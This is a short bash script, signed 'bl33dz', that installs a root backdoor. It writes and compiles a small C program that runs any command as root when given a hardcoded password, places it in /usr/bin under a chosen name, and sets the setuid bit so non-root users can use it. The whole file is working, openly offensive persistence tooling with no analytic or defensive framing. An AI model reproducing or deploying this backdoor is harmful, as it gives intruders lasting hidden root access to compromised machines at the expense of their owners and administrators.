#!/bin/bash
# Root backdoor by bl33dz

if [ $(id -u) != 0 ]; then
	echo "uid != 0"
	echo "can't run this script"
	exit
fi

if [ ! $1 ] || [ ! $2 ]; then
	echo "usage: $0 <backdoor_filename> <password>"
	exit
fi

cat > /tmp/root.c << EOF
#include<stdio.h>
#include<unistd.h>
#include<string.h>
#include<stdlib.h>

int main(int argc, char *argv[]) {
	if(argv[1] && argv[2]) {
		char pass[] = "$2";
		if(strcmp(argv[1], pass) == 0) {
			setuid(0);
			setgid(0);
			system(argv[2]);
		} else {
			printf("Err: wrong password!\n");
		}
	} else {
		printf("Usage: %s <password> <command>\n", argv[0]);
	}
	return 0;
}
EOF

if [ -f /tmp/root.c ]; then echo "[+] /tmp/root.c created"; else echo "[-] can't create /tmp/root.c"; exit; fi

if [ -x $(command -v gcc) ]; then echo "[+] gcc found"; else echo "[-] gcc not found"; exit; fi
gcc /tmp/root.c -o /tmp/root
rm -rf /tmp/root.c

mv /tmp/root /usr/bin/$1
chmod +x /usr/bin/$1
chmod +s /usr/bin/$1
if [ -x /usr/bin/$1 ]; then echo "[+] /usr/bin/$1 created and executable"; else echo "[-] /usr/bin/$1 not created or not executable"; exit; fi

echo "[+] done"
echo -e "\nrun command \"$1\" or \"/usr/bin/$1\" as non-root user"
